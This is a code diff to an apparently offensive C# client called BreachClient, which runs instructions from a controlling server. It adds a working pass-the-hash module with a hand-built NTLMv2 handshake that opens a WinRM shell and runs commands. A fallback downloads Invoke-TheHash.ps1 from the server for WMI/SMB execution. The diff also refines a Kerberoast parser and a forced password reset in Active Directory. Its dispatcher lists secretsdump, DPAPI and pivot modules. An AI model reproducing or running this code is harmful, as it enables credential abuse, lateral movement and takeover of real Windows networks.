@@ -7,8 +7,10 @@ using System.Net;
 using System.Net.Http;
 using System.Net.NetworkInformation;
 using System.Net.Sockets;
+using System.Security.Cryptography;
 using System.Text;
 using System.Text.Json;
+using System.Text.RegularExpressions;
 using System.Threading.Tasks;
 
 namespace BreachClient
@@ -81,7 +83,7 @@ namespace BreachClient
                     "kerberoast"   => await RunKerberoast(instruction),
                     "secretsdump"  => await RunDownloadAndExec(instruction),
                     "dpapi"        => await RunDownloadAndExec(instruction),
-                    "authenticate" => RunAuthenticate(instruction),
+                    "authenticate" => await RunAuthenticate(instruction),
                     "aclabuse"     => RunAclAbuse(instruction),
                     "pivot"        => await RunPivotAgent(instruction),
                     _              => ExecuteCommand(instruction)
@@ -314,6 +316,16 @@ function SkipTLV([byte[]]$bytes, [ref]$pos) {
 
 function ExtractCipher([byte[]]$apreq) {
     $pos = [ref]0
+    # GetRequest() wraps the AP-REQ in a GSS-API envelope (tag 0x60 = [APPLICATION 0]).
+    # Strip it: skip the outer tag+length, then skip the Kerberos OID TLV (tag 0x06).
+    if ($apreq[$pos.Value] -eq 0x60) {
+        $pos.Value++
+        $null = ParseLen $apreq $pos
+        $pos.Value++                        # skip OID tag (0x06)
+        $oidLen = ParseLen $apreq $pos
+        $pos.Value += $oidLen               # skip OID bytes
+        $pos.Value += 2                     # skip 2-byte RFC 1964 token type ID (0x01 0x00 for AP-REQ)
+    }
     $null = EnterTag $apreq $pos 0x6e   # Application 14 (AP-REQ)
     $null = EnterTag $apreq $pos 0x30   # SEQUENCE
     SkipTLV $apreq $pos                  # [0] pvno
@@ -447,27 +459,35 @@ foreach ($r in $results) {
 
         /// <summary>
         /// Authenticate to a remote host using a native Windows service.
-        /// Instruction format: "username|password|target|service[|command]"
-        /// Services: winrm (winrs), smb (net use), wmi (wmic)
-        /// Optional command overrides the default probe for winrm and wmi.
+        /// Instruction format: "username|credential|target|service[|command]"
+        /// credential is a plaintext password or an NTLM hash (:NT or LM:NT or 32-hex).
+        /// Services: winrm, smb, wmi.  PTH uses WinRM (native NTLM) or Invoke-TheHash (WMI/SMB).
         /// </summary>
-        static string RunAuthenticate(string instruction)
+        static async Task<string> RunAuthenticate(string instruction)
         {
             var parts = instruction.Split('|');
             if (parts.Length < 4)
-                return "[error] Invalid authenticate instruction — expected: user|password|target|service[|command]";
+                return "[error] Invalid authenticate instruction — expected: user|credential|target|service[|command]";
 
             string username = parts[0];
-            string password = parts[1];
+            string secret   = parts[1];
             string target   = parts[2];
             string service  = parts[3].ToLower();
             string? command = parts.Length >= 5 ? parts[4] : null;
 
+            if (IsNtlmHash(secret))
+                return service switch
+                {
+                    "wmi" => await RunPthTool(username, secret, target, "wmi", command),
+                    "smb" => await RunPthTool(username, secret, target, "smb", command),
+                    _     => await RunWinrmPth(username, secret, target, command)
+                };
+
             return service switch
             {
-                "smb" => RunSmbAuth(username, password, target, command),
-                "wmi" => RunWmiAuth(username, password, target, command),
-                _     => RunWinrmAuth(username, password, target, command)
+                "smb" => RunSmbAuth(username, secret, target, command),
+                "wmi" => RunWmiAuth(username, secret, target, command),
+                _     => RunWinrmAuth(username, secret, target, command)
             };
         }
 
@@ -585,6 +605,377 @@ foreach ($r in $results) {
             );
         }
 
+        // ── PTH module ────────────────────────────────────────────────────────────
+        //
+        // WinRM PTH: implements NTLMv2 by hand over a raw TCP keep-alive connection.
+        // No external tools needed; full stdout/stderr capture.
+        //
+        // WMI / SMB PTH fallback: downloads Invoke-TheHash.ps1 from the server and
+        // invokes Invoke-WMIExec / Invoke-SMBExec.  Output is blind (WMI/SMB exec
+        // does not capture stdout), so the return is a success/fail indicator.
+
+        static bool IsNtlmHash(string s)
+        {
+            if (s.StartsWith(":")) s = s[1..];
+            if (s.Contains(':'))   s = s.Split(':')[^1];
+            return s.Length == 32 && s.All(c => "0123456789abcdefABCDEF".Contains(c));
+        }
+
+        static byte[] ParseNtHash(string s)
+        {
+            if (s.StartsWith(":")) s = s[1..];
+            if (s.Contains(':'))   s = s.Split(':')[^1];
+            byte[] b = new byte[16];
+            for (int i = 0; i < 16; i++)
+                b[i] = Convert.ToByte(s.Substring(i * 2, 2), 16);
+            return b;
+        }
+
+        // Split "DOMAIN\user" or "user@domain" → (domain, user).  Plain user → (".", user).
+        static (string domain, string user) SplitDomainUser(string username)
+        {
+            int bs = username.IndexOf('\\');
+            if (bs >= 0) return (username[..bs], username[(bs + 1)..]);
+            int at = username.IndexOf('@');
+            if (at >= 0) return (username[(at + 1)..], username[..at]);
+            return (".", username);
+        }
+
+        // ── NTLM message builders ────────────────────────────────────────────────
+
+        static byte[] NtlmNegotiate()
+        {
+            // Flags: UNICODE | REQUEST_TARGET | NTLM | ALWAYS_SIGN | EXTENDED_SESS | 128 | 56 | VERSION
+            const uint flags = 0xA2088205u;
+            using var ms = new MemoryStream();
+            using var bw = new BinaryWriter(ms, Encoding.ASCII, leaveOpen: true);
+            bw.Write(Encoding.ASCII.GetBytes("NTLMSSP\0"));
+            bw.Write((uint)1);
+            bw.Write(flags);
+            bw.Write((ushort)0); bw.Write((ushort)0); bw.Write((uint)40); // DomainNameFields  (empty)
+            bw.Write((ushort)0); bw.Write((ushort)0); bw.Write((uint)40); // WorkstationFields (empty)
+            bw.Write((byte)10); bw.Write((byte)0); bw.Write((ushort)19041); // Version: Win10 19041
+            bw.Write((byte)0);  bw.Write((byte)0); bw.Write((byte)0); bw.Write((byte)15);
+            return ms.ToArray(); // 40 bytes
+        }
+
+        // Extract ServerChallenge[8] and TargetInfo blob from NTLM Type-2 message.
+        static (byte[] sc, byte[] ti) NtlmParseChallenge(byte[] t2)
+        {
+            byte[] sc = new byte[8];
+            Array.Copy(t2, 24, sc, 0, 8);
+            ushort tiLen = BitConverter.ToUInt16(t2, 40);
+            uint   tiOff = BitConverter.ToUInt32(t2, 44);
+            byte[] ti    = new byte[tiLen];
+            if (tiLen > 0 && tiOff + tiLen <= t2.Length)
+                Array.Copy(t2, tiOff, ti, 0, tiLen);
+            return (sc, ti);
+        }
+
+        // Compute NTLMv2 NT and LM responses given the NT hash.
+        static (byte[] ntResp, byte[] lmResp) NtlmComputeResponses(
+            byte[] ntHash, string user, string domain, byte[] sc, byte[] ti)
+        {
+            byte[] rk;
+            using (var h = new HMACMD5(ntHash))
+                rk = h.ComputeHash(Encoding.Unicode.GetBytes(user.ToUpperInvariant() + domain));
+
+            byte[] cc = new byte[8];
+            RandomNumberGenerator.Fill(cc);
+
+            var blob = new List<byte>();
+            blob.Add(0x01); blob.Add(0x01);                                 // RespType
+            blob.AddRange(new byte[6]);                                      // Reserved
+            blob.AddRange(BitConverter.GetBytes(DateTime.UtcNow.ToFileTime())); // Timestamp
+            blob.AddRange(cc);                                               // ClientChallenge
+            blob.AddRange(new byte[4]);                                      // Reserved
+            blob.AddRange(ti);                                               // TargetInfo
+            blob.AddRange(new byte[4]);                                      // Reserved
+            byte[] blobArr = blob.ToArray();
+
+            byte[] ntProof;
+            using (var h = new HMACMD5(rk)) ntProof = h.ComputeHash(sc.Concat(blobArr).ToArray());
+            byte[] ntResp = ntProof.Concat(blobArr).ToArray();
+
+            byte[] lmProof;
+            using (var h = new HMACMD5(rk)) lmProof = h.ComputeHash(sc.Concat(cc).ToArray());
+            byte[] lmResp = lmProof.Concat(cc).ToArray(); // 24 bytes
+
+            return (ntResp, lmResp);
+        }
+
+        // Build NTLM Type-3 Authenticate message.
+        static byte[] NtlmAuthenticate(string user, string domain, byte[] ntResp, byte[] lmResp)
+        {
+            byte[] domB  = Encoding.Unicode.GetBytes(domain);
+            byte[] userB = Encoding.Unicode.GetBytes(user);
+            byte[] wsB   = Encoding.Unicode.GetBytes(Environment.MachineName);
+            const uint flags = 0xA2088205u;
+            // Fixed header: sig(8) + type(4) + 6×SecurityBuffer(8) + flags(4) + version(8) = 72 bytes
+            uint off     = 72u;
+            uint lmOff   = off;
+            uint ntOff   = lmOff   + (uint)lmResp.Length;
+            uint domOff  = ntOff   + (uint)ntResp.Length;
+            uint userOff = domOff  + (uint)domB.Length;
+            uint wsOff   = userOff + (uint)userB.Length;
+            uint sessOff = wsOff   + (uint)wsB.Length;
+            using var ms = new MemoryStream();
+            using var bw = new BinaryWriter(ms, Encoding.ASCII, leaveOpen: true);
+            bw.Write(Encoding.ASCII.GetBytes("NTLMSSP\0"));
+            bw.Write((uint)3);
+            bw.Write((ushort)lmResp.Length);  bw.Write((ushort)lmResp.Length);  bw.Write(lmOff);
+            bw.Write((ushort)ntResp.Length);  bw.Write((ushort)ntResp.Length);  bw.Write(ntOff);
+            bw.Write((ushort)domB.Length);    bw.Write((ushort)domB.Length);    bw.Write(domOff);
+            bw.Write((ushort)userB.Length);   bw.Write((ushort)userB.Length);   bw.Write(userOff);
+            bw.Write((ushort)wsB.Length);     bw.Write((ushort)wsB.Length);     bw.Write(wsOff);
+            bw.Write((ushort)0); bw.Write((ushort)0); bw.Write(sessOff); // SessionKey (empty)
+            bw.Write(flags);
+            bw.Write((byte)10); bw.Write((byte)0); bw.Write((ushort)19041);
+            bw.Write((byte)0);  bw.Write((byte)0); bw.Write((byte)0); bw.Write((byte)15);
+            bw.Write(lmResp); bw.Write(ntResp); bw.Write(domB); bw.Write(userB); bw.Write(wsB);
+            return ms.ToArray();
+        }
+
+        // ── WinRM SOAP templates ─────────────────────────────────────────────────
+
+        static string XmlEsc(string s) =>
+            s.Replace("&", "&amp;").Replace("<", "&lt;").Replace(">", "&gt;").Replace("\"", "&quot;");
+
+        // Namespace-agnostic: finds first element with the given local name and returns its text content.
+        static string? XmlText(string xml, string local) =>
+            Regex.Match(xml, $@"<[^:>\s]*:?{Regex.Escape(local)}[^>]*>([^<]*)<",
+                RegexOptions.IgnoreCase) is { Success: true } m
+                ? m.Groups[1].Value.Trim() : null;
+
+        const string _wsNs =
+            "xmlns:env=\"http://www.w3.org/2003/05/soap-envelope\" " +
+            "xmlns:a=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\" " +
+            "xmlns:w=\"http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\" " +
+            "xmlns:rsp=\"http://schemas.microsoft.com/wbem/wsman/1/windows/shell\"";
+
+        static string WsHdr(string target, string action, string? shellId = null) =>
+$@"<env:Header>
+    <a:To>http://{target}:5985/wsman</a:To>
+    <a:ReplyTo><a:Address env:mustUnderstand=""true"">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address></a:ReplyTo>
+    <a:Action env:mustUnderstand=""true"">{action}</a:Action>
+    <a:MessageID>uuid:{Guid.NewGuid():D}</a:MessageID>
+    <w:ResourceURI env:mustUnderstand=""true"">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>
+    <w:OperationTimeout>PT60.000S</w:OperationTimeout>
+    <w:MaxEnvelopeSize env:mustUnderstand=""true"">153600</w:MaxEnvelopeSize>
+    {(shellId != null ? $"<w:SelectorSet><w:Selector Name=\"ShellId\">{shellId}</w:Selector></w:SelectorSet>" : "")}
+  </env:Header>";
+
+        static string WsCreateShell(string t) =>
+$@"<?xml version=""1.0"" encoding=""UTF-8""?><env:Envelope {_wsNs}>{WsHdr(t, "http://schemas.xmlsoap.org/ws/2004/09/transfer/Create")}<env:Body><rsp:Shell><rsp:InputStreams>stdin</rsp:InputStreams><rsp:OutputStreams>stdout stderr</rsp:OutputStreams></rsp:Shell></env:Body></env:Envelope>";
+
+        static string WsCommand(string t, string sid, string cmd) =>
+$@"<?xml version=""1.0"" encoding=""UTF-8""?><env:Envelope {_wsNs}>{WsHdr(t, "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command", sid)}<env:Body><rsp:CommandLine><rsp:Command>cmd</rsp:Command><rsp:Arguments>/c {XmlEsc(cmd)}</rsp:Arguments></rsp:CommandLine></env:Body></env:Envelope>";
+
+        static string WsReceive(string t, string sid, string cid) =>
+$@"<?xml version=""1.0"" encoding=""UTF-8""?><env:Envelope {_wsNs}>{WsHdr(t, "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive", sid)}<env:Body><rsp:Receive><rsp:DesiredStream CommandId=""{cid}"">stdout stderr</rsp:DesiredStream></rsp:Receive></env:Body></env:Envelope>";
+
+        static string WsSignal(string t, string sid, string cid) =>
+$@"<?xml version=""1.0"" encoding=""UTF-8""?><env:Envelope {_wsNs}>{WsHdr(t, "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Signal", sid)}<env:Body><rsp:Signal CommandId=""{cid}""><rsp:Code>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/signal/terminate</rsp:Code></rsp:Signal></env:Body></env:Envelope>";
+
+        static string WsDelete(string t, string sid) =>
+$@"<?xml version=""1.0"" encoding=""UTF-8""?><env:Envelope {_wsNs}>{WsHdr(t, "http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete", sid)}<env:Body></env:Body></env:Envelope>";
+
+        // ── Raw HTTP helpers (keep-alive TCP — required for connection-bound NTLM) ─
+
+        static async Task PthSend(NetworkStream ns, string host, string? auth, string? soap)
+        {
+            byte[] body = soap != null ? Encoding.UTF8.GetBytes(soap) : Array.Empty<byte>();
+            var sb = new StringBuilder();
+            sb.Append("POST /wsman HTTP/1.1\r\n");
+            sb.Append($"Host: {host}:5985\r\n");
+            if (!string.IsNullOrEmpty(auth)) sb.Append($"Authorization: NTLM {auth}\r\n");
+            sb.Append("Connection: keep-alive\r\n");
+            if (body.Length > 0)
+            {
+                sb.Append("Content-Type: application/soap+xml;charset=UTF-8\r\n");
+                sb.Append($"Content-Length: {body.Length}\r\n");
+            }
+            else sb.Append("Content-Length: 0\r\n");
+            sb.Append("\r\n");
+            byte[] hdr = Encoding.ASCII.GetBytes(sb.ToString());
+            await ns.WriteAsync(hdr);
+            if (body.Length > 0) await ns.WriteAsync(body);
+            await ns.FlushAsync();
+        }
+
+        static async Task<(int status, string ntlm, string body)> PthRead(NetworkStream ns)
+        {
+            // Read until \r\n\r\n
+            var raw = new List<byte>(512);
+            int a = 0, b = 0, c = 0;
+            while (true)
+            {
+                int ch = ns.ReadByte(); if (ch < 0) break;
+                raw.Add((byte)ch);
+                if (a == '\r' && b == '\n' && c == '\r' && ch == '\n') break;
+                a = b; b = c; c = ch;
+            }
+            string[] lines = Encoding.ASCII.GetString(raw.ToArray())
+                                     .Split("\r\n", StringSplitOptions.RemoveEmptyEntries);
+
+            int status = 0;
+            if (lines.Length > 0 && lines[0].Split(' ') is { Length: >= 2 } sp)
+                int.TryParse(sp[1], out status);
+
+            string ntlm = ""; int clen = 0; bool chunked = false;
+            foreach (var ln in lines.Skip(1))
+            {
+                int ci = ln.IndexOf(':'); if (ci < 0) continue;
+                string k = ln[..ci].Trim().ToLowerInvariant();
+                string v = ln[(ci + 1)..].Trim();
+                if      (k == "www-authenticate" && v.StartsWith("NTLM ", StringComparison.OrdinalIgnoreCase))
+                    ntlm = v[5..].Trim();
+                else if (k == "content-length" && int.TryParse(v, out int cl)) clen = cl;
+                else if (k == "transfer-encoding" && v.Equals("chunked", StringComparison.OrdinalIgnoreCase)) chunked = true;
+            }
+
+            string body = "";
+            if (clen > 0)
+            {
+                byte[] buf = new byte[clen]; int rd = 0;
+                while (rd < clen) { int n = await ns.ReadAsync(buf.AsMemory(rd, clen - rd)); if (n <= 0) break; rd += n; }
+                body = Encoding.UTF8.GetString(buf, 0, rd);
+            }
+            else if (chunked)
+            {
+                var acc = new List<byte>();
+                while (true)
+                {
+                    var szB = new List<byte>(); int prev = 0;
+                    while (true)
+                    {
+                        int ch = ns.ReadByte(); if (ch < 0) break;
+                        szB.Add((byte)ch);
+                        if (prev == '\r' && ch == '\n') break;
+                        prev = ch;
+                    }
+                    if (!int.TryParse(Encoding.ASCII.GetString(szB.ToArray()).Trim(),
+                                      System.Globalization.NumberStyles.HexNumber, null, out int csz) || csz == 0) break;
+                    byte[] chunk = new byte[csz]; int rd = 0;
+                    while (rd < csz) { int n = await ns.ReadAsync(chunk.AsMemory(rd, csz - rd)); if (n <= 0) break; rd += n; }
+                    acc.AddRange(chunk[..rd]);
+                    ns.ReadByte(); ns.ReadByte(); // trailing \r\n
+                }
+                body = Encoding.UTF8.GetString(acc.ToArray());
+            }
+            return (status, ntlm, body);
+        }
+
+        // ── WinRM PTH (native NTLM — no tool upload, full stdout/stderr capture) ──
+
+        static async Task<string> RunWinrmPth(string username, string hashHex, string target, string? command)
+        {
+            byte[] ntHash = ParseNtHash(hashHex);
+            var (domain, user) = SplitDomainUser(username);
+            string cmd = string.IsNullOrWhiteSpace(command) ? "whoami && hostname && ipconfig" : command;
+
+            try
+            {
+                using var tcp = new TcpClient { ReceiveTimeout = 20000, SendTimeout = 10000 };
+                await tcp.ConnectAsync(target, 5985);
+                using var ns = tcp.GetStream();
+
+                // ── Step 1: NTLM Type1 Negotiate ──────────────────────────────
+                await PthSend(ns, target, Convert.ToBase64String(NtlmNegotiate()), null);
+                var (s1, tok, _) = await PthRead(ns);
+                if (s1 != 401 || string.IsNullOrEmpty(tok))
+                    return $"[pth] NTLM handshake failed — HTTP {s1}";
+
+                // ── Step 2: Compute NTLMv2 from challenge ─────────────────────
+                var (sc, ti) = NtlmParseChallenge(Convert.FromBase64String(tok));
+                var (ntR, lmR) = NtlmComputeResponses(ntHash, user, domain, sc, ti);
+                string t3 = Convert.ToBase64String(NtlmAuthenticate(user, domain, ntR, lmR));
+
+                // ── Step 3: Authenticate + CreateShell ────────────────────────
+                await PthSend(ns, target, t3, WsCreateShell(target));
+                var (s2, _, createBody) = await PthRead(ns);
+                if (s2 != 200) return $"[pth] Authentication failed — HTTP {s2}";
+
+                string? shellId = XmlText(createBody, "ShellId");
+                if (string.IsNullOrEmpty(shellId))
+                    return "[pth] CreateShell succeeded but ShellId not found in response";
+
+                // ── Step 4: Run command ───────────────────────────────────────
+                await PthSend(ns, target, null, WsCommand(target, shellId, cmd));
+                var (s3, _, cmdBody) = await PthRead(ns);
+                if (s3 != 200) return $"[pth] Command dispatch failed — HTTP {s3}";
+
+                string? cmdId = XmlText(cmdBody, "CommandId");
+                if (string.IsNullOrEmpty(cmdId)) return "[pth] Could not parse CommandId";
+
+                // ── Step 5: Collect output ────────────────────────────────────
+                var stdout = new StringBuilder();
+                var stderr = new StringBuilder();
+                var streamRx = new Regex(
+                    @"<[^:>\s]*:?Stream\s[^>]*Name=""(?<n>[^""]+)""[^>]*>(?<d>[^<]*)<",
+                    RegexOptions.IgnoreCase);
+
+                for (int i = 0; i < 30; i++)
+                {
+                    await PthSend(ns, target, null, WsReceive(target, shellId, cmdId));
+                    var (s4, _, rcv) = await PthRead(ns);
+                    if (s4 != 200) break;
+                    foreach (Match m in streamRx.Matches(rcv))
+                    {
+                        string b64 = m.Groups["d"].Value.Trim();
+                        if (string.IsNullOrEmpty(b64)) continue;
+                        try
+                        {
+                            string decoded = Encoding.UTF8.GetString(Convert.FromBase64String(b64));
+                            if (m.Groups["n"].Value == "stdout") stdout.Append(decoded);
+                            else stderr.Append(decoded);
+                        }
+                        catch { }
+                    }
+                    if (rcv.Contains("CommandState/Done", StringComparison.Ordinal)) break;
+                }
+
+                // ── Step 6: Cleanup ───────────────────────────────────────────
+                try
+                {
+                    await PthSend(ns, target, null, WsSignal(target, shellId, cmdId));
+                    _ = await PthRead(ns);
+                    await PthSend(ns, target, null, WsDelete(target, shellId));
+                    _ = await PthRead(ns);
+                }
+                catch { }
+
+                string result = stdout.ToString().TrimEnd();
+                if (stderr.Length > 0) result += "\n[stderr] " + stderr.ToString().TrimEnd();
+                return string.IsNullOrEmpty(result) ? "[pth] Command executed (no output)" : result;
+            }
+            catch (Exception e) { return $"[pth error] {e.Message}"; }
+        }
+
+        // ── PTH fallback: Invoke-TheHash for WMI / SMB (blind exec) ──────────────
+
+        static async Task<string> RunPthTool(string username, string hashHex, string target, string service, string? command)
+        {
+            string? toolPath = await DownloadTool("Invoke-TheHash.ps1");
+            if (toolPath == null)
+                return "[pth] Invoke-TheHash.ps1 not in server/files/ — place it there for WMI/SMB PTH";
+
+            var (domain, user) = SplitDomainUser(username);
+            string nt  = hashHex.StartsWith(":") ? hashHex[1..] : hashHex.Contains(':') ? hashHex.Split(':')[^1] : hashHex;
+            string cmd = string.IsNullOrWhiteSpace(command) ? "whoami && hostname" : command;
+            string fn  = service == "smb" ? "Invoke-SMBExec" : "Invoke-WMIExec";
+
+            string script =
+                $". '{toolPath}'\n" +
+                $"{fn} -Target {target} -Domain '{domain}' -Username '{user}' -Hash {nt} " +
+                $"-Command 'cmd /c {cmd.Replace("'", "''")}' 2>&1";
+
+            string result = RunPowerShell(script);
+            return string.IsNullOrWhiteSpace(result)
+                ? $"[pth/{service.ToUpper()}] Command dispatched (blind exec — Invoke-TheHash does not capture stdout)"
+                : result;
+        }
+
         // ── ACL abuse module ──────────────────────────────────────────────────────
 
         /// <summary>
@@ -649,9 +1040,11 @@ foreach ($r in $results) {
                 CreateNoWindow         = true,
             };
             using var proc = Process.Start(psi)!;
-            string stdout = proc.StandardOutput.ReadToEnd();
-            string stderr = proc.StandardError.ReadToEnd();
+            var stdoutTask = proc.StandardOutput.ReadToEndAsync();
+            var stderrTask = proc.StandardError.ReadToEndAsync();
             proc.WaitForExit();
+            string stdout = stdoutTask.Result;
+            string stderr = stderrTask.Result;
             return string.IsNullOrWhiteSpace(stderr) ? stdout : stdout + "\n[stderr] " + stderr;
         }
 
@@ -682,11 +1075,18 @@ $groupEntry.CommitChanges()
         }
 
         // forcechangepassword|<user>|<newpassword>[|altuser|altpass]
+        // Uses ADSI Invoke('SetPassword') with AuthenticationTypes.Secure|Sealing so the LDAP
+        // connection is signed+sealed (NTLM/Kerberos). The DC checks the AD ACL (GenericAll includes
+        // User-Force-Change-Password) rather than the SAMR privilege table, which blocks non-DA callers
+        // on accounts that were ever in a privileged group.
         static string AclForceChangePassword(string[] p)
         {
             if (p.Length < 3) return "[error] forcechangepassword: requires user|newpassword";
             var (altUser, altPass) = ExtractCreds(p, 3);
-            string credArgs = altUser != null ? $", '{altUser}', '{altPass}'" : "";
+            string authType = "[System.DirectoryServices.AuthenticationTypes]::Secure -bor [System.DirectoryServices.AuthenticationTypes]::Sealing";
+            string entryLine = altUser != null
+                ? $"$u = New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://$_d/$dn\", '{altUser}', '{altPass}', ({authType}))"
+                : $"$u = New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://$_d/$dn\", $null, $null, ({authType}))";
             string script = $@"
 {AdsiRoot(altUser, altPass)}
 $s = New-Object System.DirectoryServices.DirectorySearcher($root)
@@ -694,7 +1094,7 @@ $s.Filter = '(sAMAccountName={p[1]})'
 $r = $s.FindOne()
 if (-not $r) {{ throw 'User {p[1]} not found' }}
 $dn = $r.Properties['distinguishedName'][0]
-$u = New-Object System.DirectoryServices.DirectoryEntry(""LDAP://$dn""{credArgs})
+{entryLine}
 $u.Invoke('SetPassword', '{p[2]}')
 $u.CommitChanges()
 '[+] Password changed for {p[1]}'
